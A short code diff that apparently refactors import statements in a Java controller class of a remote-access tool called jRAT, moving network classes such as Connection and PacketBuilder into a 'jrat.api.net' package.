@@ -4,12 +4,12 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 
-import jrat.api.Connection;
-import jrat.api.PacketBuilder;
-import jrat.api.Queue;
 import jrat.api.Client;
-import jrat.api.Reader;
-import jrat.api.Writer;
+import jrat.api.net.Connection;
+import jrat.api.net.PacketBuilder;
+import jrat.api.net.Queue;
+import jrat.api.net.Reader;
+import jrat.api.net.Writer;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.SampleMode;
